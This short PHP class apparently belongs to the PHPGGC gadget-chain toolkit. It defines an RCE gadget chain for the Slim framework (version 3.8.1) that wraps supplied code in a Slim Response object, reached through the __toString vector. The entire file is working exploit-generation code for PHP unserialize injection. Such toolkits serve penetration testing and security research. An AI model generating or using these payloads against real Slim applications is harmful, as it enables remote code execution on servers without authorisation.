<?php

namespace GadgetChain\Slim;

class RCE1 extends \PHPGGC\GadgetChain\RCE
{
    public $version = '3.8.1';
    public $vector = '__toString';
    public $author = 'cf';

    public function generate(array $parameters)
    {
        $code = $parameters['code'];

        return new \Slim\Http\Response($code);
    }
}